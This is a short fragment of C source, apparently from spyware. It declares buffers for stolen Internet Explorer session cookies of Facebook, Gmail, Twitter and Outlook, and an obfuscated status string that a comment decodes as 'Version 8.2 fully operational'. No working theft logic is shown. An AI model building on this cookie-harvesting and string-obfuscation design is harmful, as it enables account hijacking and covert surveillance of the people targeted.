...
char FACEBOOK_IE_COOKIE[4096];
char GMAIL_IE_COOKIE[4096];
char TWITTER_IE_COOKIE[4096];
char OUTLOOK_IE_COOKIE[4096];
...
void __stdcall HM_sMain(void)
{
	...
	ScrambleString ss7("\r\n Xlt1UEP k.p zdWWJ E7lt8vUEP8W\r\n\r\n"); // "\r\n Version 8.2 fully operational\r\n\r\n"
